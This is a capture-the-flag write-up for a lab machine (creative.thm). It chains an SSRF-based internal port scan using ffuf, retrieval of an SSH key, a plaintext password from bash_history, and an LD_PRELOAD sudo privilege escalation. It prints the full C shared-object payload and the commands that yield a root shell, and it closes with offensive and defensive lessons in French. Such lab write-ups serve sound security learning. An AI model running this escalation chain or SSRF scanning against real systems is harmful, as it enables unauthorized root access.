## Summary

Linux machine running nginx. Initial enumeration revealed a subdomain hosting a URL testing tool vulnerable to SSRF. The SSRF was used to discover an internal service on port 1337 exposing the filesystem via directory listing. Saad's SSH private key was retrieved, cracked, and used for initial access. Privilege escalation achieved via LD_PRELOAD abuse with sudo.

## Exploitation

### SSRF Discovery

Tested [http://127.0.0.1](http://127.0.0.1/) -> returned creative.thm content (SSRF confirmed)

### Internal Port Scanning via SSRF

ffuf -w /usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt -u [http://beta.creative.thm](http://beta.creative.thm/) -d "url=http://127.0.0.1:FUZZ" -X POST -H "Content-Type: application/x-www-form-urlencoded" -fs 0 -t 20 --timeout 30

Port 1337: returned full filesystem directory listing

## Privilege Escalation

### Password in bash_history

cat ~/.bash_history -> echo "saad:MyStrongestPasswordYet$4291" > creds.txt

### sudo -l

sudo -l

# Password: MyStrongestPasswordYet$4291

Output:

- env_keep+=LD_PRELOAD
- (root) /usr/bin/ping

### LD_PRELOAD Exploit

cat > /tmp/shell.c << EOF #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); } EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles sudo LD_PRELOAD=/tmp/shell.so ping

Result: Root shell

## Lessons Learned

🔴 Côté Attaquant (Offensive)

VHost enumeration avec ffuf = surface d'attaque élargie → le domaine principal ne montrait rien d'intéressant, mais beta.creative.thm exposait un outil interne critique. Toujours fuzzer les sous-domaines avant de conclure qu'une cible est limitée.
SSRF + scan de ports internes = pivot puissant → confirmer le SSRF sur 127.0.0.1 n'est que la première étape. Chaîner avec un scan de ports internes via ffuf a révélé le port 1337 — un service filesystem accessible uniquement depuis localhost.
SSRF → filesystem listing → clé SSH privée → le port 1337 exposait un directory listing complet. Récupérer id_rsa directement via SSRF est un accès initial sans aucune interaction avec l'application principale.
.bash_history après accès initial = réflexe obligatoire → le mot de passe de saad était en clair dans l'historique bash. Un développeur qui tape accidentellement ses credentials dans le terminal les logue définitivement si HISTFILE n'est pas désactivé.
env_keep+=LD_PRELOAD dans sudo = escalade triviale → si sudo préserve LD_PRELOAD, compiler un .so malveillant avec _init() et l'injecter via sudo LD_PRELOAD= sur n'importe quel binaire autorisé donne root immédiatement.


🔵 Côté Défenseur (Defensive / Blue Team)

Les outils internes de test d'URL ne doivent jamais être accessibles publiquement sans authentification — un URL tester est un SSRF par conception si mal restreint.
Lier les services internes sur 127.0.0.1 ne suffit pas si l'application elle-même peut faire des requêtes arbitraires — filtrer les plages d'IP internes côté serveur.
Ne jamais préserver LD_PRELOAD dans la configuration sudo (env_keep). C'est une escalade de privilèges documentée et triviale.
Auditer .bash_history des comptes de service — et former les développeurs à ne jamais taper des credentials directement dans le terminal.
